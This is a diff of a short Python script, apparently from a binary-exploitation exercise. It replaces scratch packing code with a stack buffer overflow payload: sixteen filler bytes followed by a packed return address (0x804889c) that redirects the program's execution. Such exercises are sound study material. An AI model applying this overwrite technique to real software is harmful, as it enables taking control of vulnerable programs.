@@ -54,21 +54,6 @@ Values of saved frame ptr and return addr in this frame
 			 should be 0x0804889c
 
 '''
-ret = "0804889c"
 from struct import pack
-#print pack("<I", 0xDEADBEEF)
-#print pack("<I", int("deadbeef", 16))
-p = pack("<I", int("A"*8, 16))
-padding = p + p + p
-padding += pack("<I", int(ret[4:] + "A"*4, 16)) 
-padding += pack("<I", int(ret[:4], 16))
-#print padding
-#print pack("<I", int("AAAA", 16))
-
-out = ""
-out += pack("<I", 1)
-out += pack("<I", 2)
-out += pack("<I", 3)
-out += pack("<I", 4)
-out += pack("<I", 5)
-print out
+addr = pack("<I", 0x804889c)
+print("A"*16 + addr)
